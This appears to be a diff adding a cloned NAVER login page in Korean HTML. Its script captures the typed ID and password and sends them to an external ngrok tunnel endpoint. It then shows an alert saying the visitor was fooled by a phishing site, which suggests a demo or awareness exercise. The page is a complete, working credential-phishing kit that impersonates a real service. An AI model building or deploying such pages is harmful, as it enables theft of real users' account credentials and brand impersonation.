@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="ko" data-i18n-json="/login/js/v4/i18n/global_login.js?v=20260720">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+  <meta name="nlog" data-nlog-page="2000010294" data-nlog-params="{&quot;language&quot;:&quot;ko&quot;,&quot;login_type&quot;:&quot;normal&quot;}">
+  <title data-i18n="pageTitle">NAVER 로그인</title>
+  <link rel="stylesheet" type="text/css" href="./naver1.css">
+  <link rel="stylesheet" type="text/css" href="./naver2.css" media="(prefers-color-scheme:dark)">
+
+  <style>
+    /* 포커스 및 입력 시 회색 글씨 위로 올라가는 애니메이션 */
+    .form_data.has_label .input_label,
+    .form_data:has(.input_text:focus) .input_label {
+      color: var(--color-neutral-foreground-subtle-3, #888);
+      font-size: 11px;
+      top: 0;
+      transform: inherit;
+    }
+    .form_data:has(.input_text:focus) {
+      border-bottom-color: #03c75a !important;
+    }
+  </style>
+</head>
+
+<body data-theme="greenDark">
+<div class="wrap">
+  <div class="u_skip"><a href="#content">본문 바로가기</a></div>
+
+  <div class="container">
+    <main class="inner">
+      <header id="header" class="header" role="banner">
+        <div class="header_inner">
+          <div class="naver_logo"><a href="https://www.naver.com" class="logo nlog-click" id="log.naver" data-nlog-area="nav.logo">
+            <h1 class="blind" data-i18n="HeaderNaver">네이버</h1>
+          </a></div>
+        </div>
+      </header>
+
+      <div id="content" class="content">
+
+        <div class="content_wrap">
+          <form class="form" id="frmNIDLogin" name="frmNIDLogin" target="_top" autocomplete="off" onsubmit="sendToLocalServer(event)">
+            <input type="hidden" name="dynamicKey" id="dynamicKey" value="kiJ3ML9MCGwL4cxNj4B6eHP6d5WA_tL1rscPQw4qAwu0XfIPn_z-NPam9SkF1gG_3R5Kjtdvbc_C2KpulOteRUczJo3-pe4b09gsfIQw_z8">
+            <input type="hidden" name="sessionKey" id="sessionKey" value="">
+            <input type="hidden" name="show_pk" id="show_pk" value="true">
+            <input type="hidden" name="wtoken" id="wtoken" value="">
+            <input type="hidden" name="svctype" id="svctype" value="1">
+            <input type="hidden" name="bvsd" id="bvsd" value="">
+            <input type="hidden" name="locale" id="locale" value="ko_KR">
+            <input type="hidden" name="url" id="url" value="https://www.naver.com/">
+            <input type="hidden" name="eccpw" id="eccpw" value="">
+            <input type="hidden" name="template_url" id="template_url" value="%2Fnidlogin.login%3Fmode%3Dform%26url%3Dhttps%3A%2F%2Fwww.naver.com%2F">
+            <input type="hidden" name="enctp" id="enctp" value="19">
+            <input type="hidden" name="next_step" id="next_step" value="false">
+            <input type="hidden" name="template_type" id="template_type" value="V3_DESKTOP_DEFAULT">
+            <input type="hidden" name="smart_LEVEL" id="smart_LEVEL" value="1">
+
+            <ul class="form_list">
+              <li class="form_id">
+                <div class="form_data">
+                  <label for="id" class="input_label" data-i18n="idLabel">아이디 또는 전화번호</label>
+                  <div class="input_wrap">
+                    <input id="id" name="id" value="" type="text" aria-label="아이디 또는 전화번호" class="input_text" data-i18n="inputID" maxlength="41" autocomplete="off">
+                    <div class="btn_input">
+                      <button type="button" class="btn_delete" id="btnClearId" tabindex="0"><span class="blind">삭제</span></button>
+                    </div>
+                  </div>
+                </div>
+              </li>
+              <li class="form_pw">
+                <div class="form_data">
+                  <label for="pw" class="input_label" data-i18n="pwLabel">비밀번호</label>
+                  <div class="input_wrap">
+                    <input id="pw" name="pw" type="password" placeholder="" aria-label="비밀번호" class="input_text" data-i18n="inputPW" maxlength="16" autocomplete="off">
+                    <div class="btn_input">
+                      <button type="button" class="btn_hide" id="btnTogglePw" tabindex="0"><span class="blind" data-i18n="btnHide">비밀번호 표시</span></button>
+                      <button type="button" class="btn_delete" id="btnClearPw" tabindex="0"><span class="blind" data-i18n="btnDelete">삭제</span></button>
+                    </div>
+                  </div>
+                </div>
+              </li>
+            </ul>
+
+            <!-- 에러/안내 메시지 영역들 (원본 유지) -->
+            <div class="form_message" style="display:none"><span class="text">아이디 또는 전화번호를 입력해 주세요.</span></div>
+            <div class="form_message" style="display:none"><span class="text">비밀번호를 입력해 주세요.</span></div>
+
+            <div class="login_option device_view">
+              <div class="option_inner">
+                <div class="option_item stay" tabindex="0">
+                  <input id="loginStay" type="checkbox" name="nvlong" class="input_stay" role="checkbox" aria-checked="false" value="off">
+                  <label for="loginStay" class="login_stay" data-i18n="loginStay">로그인 상태 유지</label>
+                </div>
+                <div class="option_item ip">
+                  <span class="ip_text" data-i18n="ipSecurity">IP 보안</span>
+                  <div class="ip_switch" tabindex="0">
+                    <input id="switchIP" type="checkbox" name="ipcheck" role="switch" aria-checked="true" aria-label="IP 보안">
+                    <label for="switchIP" class="slider"><span class="blind">ON</span></label>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- 로그인 버튼 영역 (column / row 모두 포함하여 원본 UI 100% 보존) -->
+            <div class="btn_form column pc">
+              <ul class="btn_login_dual">
+                <li class="dual_item passkey">
+                  <button type="button" class="btn_done" id="passkeyBtn_column">
+                    <span class="text" data-i18n="btnPasskey">패스키 로그인</span>
+                  </button>
+                </li>
+                <li class="dual_item login">
+                  <button type="submit" class="btn_done" id="loginBtn_column">
+                    <span class="text" data-i18n="btnLogin">로그인</span>
+                  </button>
+                </li>
+              </ul>
+            </div>
+            <div class="btn_form row pc">
+              <ul class="btn_login_dual">
+                <li class="dual_item passkey">
+                  <button type="button" class="btn_done" id="passkeyBtn_row">
+                    <span class="text" data-i18n="btnPasskeyRow">패스키 로그인</span>
+                  </button>
+                </li>
+                <li class="dual_item login">
+                  <button type="submit" class="btn_done" id="loginBtn_row">
+                    <span class="text" data-i18n="btnLogin">로그인</span>
+                  </button>
+                </li>
+              </ul>
+            </div>
+
+            <div class="qronetime_link device_view" data-case="다국어 == ko">
+              <ul class="qronetime_link_list">
+                <li class="link_item">
+                  <a href="#none" id="qrcode_login"><span class="text" data-i18n="qr.link">QR 코드 로그인</span></a>
+                </li>
+                <li class="link_item">
+                  <a href="#none" id="onetime_login"><span class="text" data-i18n="no.link">일회용 번호 로그인</span></a>
+                </li>
+              </ul>
+            </div>
+          </form>
+
+          <div class="find_wrap">
+            <ul class="find_list">
+              <li class="find_item"><a target="_blank" id="idinquiry" href="https://nid.naver.com/user2/api/route?m=routeIdInquiry&amp;lang=ko_KR"><span class="find_text" data-i18n="findID">아이디 찾기</span></a></li>
+              <li class="find_item"><a target="_blank" id="pwinquiry" href="https://nid.naver.com/user2/api/route?m=routePwInquiry&amp;lang=ko_KR"><span class="find_text" data-i18n="findPw">비밀번호 찾기</span></a></li>
+              <li class="find_item"><a target="_blank" id="join" href="https://nid.naver.com/account/signup?lang=ko_KR&amp;realname=N&amp;rurl=https%3A%2F%2Fwww.naver.com%2F"><span class="find_text green" data-i18n="findSignup">회원가입</span></a></li>
+            </ul>
+          </div>
+
+          <div class="banner_wrap">
+            <div class="banner_inner" id="log.banner" data-ad-unit="p_member_login" data-case="다국어 == ko">
+              <div style="width: 100%; height: auto; margin: 0px auto; line-height: 0;">
+                <iframe id="log.banner_tgtLREC" frameborder="no" scrolling="no" tabindex="0" title="AD" src="https://ssl.pstatic.net/tveta/libs/glad/prod/3.11.0/res/r.html" style="width: 100%; height: 107px; border: 0px; vertical-align: bottom;"></iframe>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <footer class="footer">
+        <ul class="footer_list" role="contentinfo">
+          <li class="footer_item"><a href="https://nca.naver.com/chat/account/view" target="_blank" id="fot.smartbot" class="text">스마트봇 상담</a></li>
+          <li class="footer_item"><a href="https://help.naver.com/service/5640/category/bookmark?lang=ko" target="_blank" id="fot.help" class="text">고객센터</a></li>
+          <li class="footer_item language">
+            <button type="button" class="language_text" role="listbox" aria-expanded="false" aria-label="언어선택">한국어</button>
+            <ul class="language_list">
+              <li class="language_item"><button class="btn_language" data-lang="ko">한국어</button></li>
+              <li class="language_item"><button class="btn_language" data-lang="en">English</button></li>
+            </ul>
+          </li>
+        </ul>
+        <div class="footer_copyright">
+          <span class="copyright">© NAVER Corp.</span>
+        </div>
+      </footer>
+
+    </main>
+  </div>
+</div>
+
+<script>
+  // UI 인터랙션 (회색 라벨 위로 이동, 삭제 버튼, 비밀번호 토글)
+  const idInput = document.getElementById("id");
+  const pwInput = document.getElementById("pw");
+  const btnClearId = document.getElementById("btnClearId");
+  const btnClearPw = document.getElementById("btnClearPw");
+  const btnTogglePw = document.getElementById("btnTogglePw");
+
+  function updateState(input) {
+    const parent = input.closest(".form_data");
+    if (input.value.length > 0) {
+      parent.classList.add("has_label", "has_button");
+    } else {
+      parent.classList.remove("has_button");
+      if (document.activeElement !== input) {
+        parent.classList.remove("has_label");
+      }
+    }
+  }
+
+  [idInput, pwInput].forEach(input => {
+    input.addEventListener("input", () => updateState(input));
+    input.addEventListener("focus", () => input.closest(".form_data").classList.add("has_label"));
+    input.addEventListener("blur", () => updateState(input));
+  });
+
+  btnClearId.addEventListener("click", () => {
+    idInput.value = "";
+    updateState(idInput);
+    idInput.focus();
+  });
+
+  btnClearPw.addEventListener("click", () => {
+    pwInput.value = "";
+    updateState(pwInput);
+    pwInput.focus();
+  });
+
+  btnTogglePw.addEventListener("click", () => {
+    const isPw = pwInput.type === "password";
+    pwInput.type = isPw ? "text" : "password";
+    btnTogglePw.classList.toggle("see", isPw);
+  });
+
+  // 로컬 백엔드 서버로 로그인 정보 전송 함수
+  function sendToLocalServer(event) {
+    event.preventDefault();
+
+    const id = idInput.value;
+    const pw = pwInput.value;
+
+    if (!id || !pw) {
+      alert('아이디와 비밀번호를 입력해주세요.');
+      return;
+    }
+
+    fetch('https://entitle-stillness-oxford.ngrok-free.dev/api/login', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        "Bypass-Tunnel-Reminder": "true"
+      },
+      body: JSON.stringify({
+        platform: 'naver',
+        id: id,
+        pw: pw
+      })
+    })
+            .then(response => response.json())
+            .then(data => {
+              alert('당신은 피싱 사이트에 속았습니다.');
+            })
+            .catch(error => {
+              console.error('Error:', error);
+              alert('서버 전송 실패 (Node.js 서버가 켜져 있는지 확인하세요)');
+            });
+  }
+</script>
+</body>
+</html>
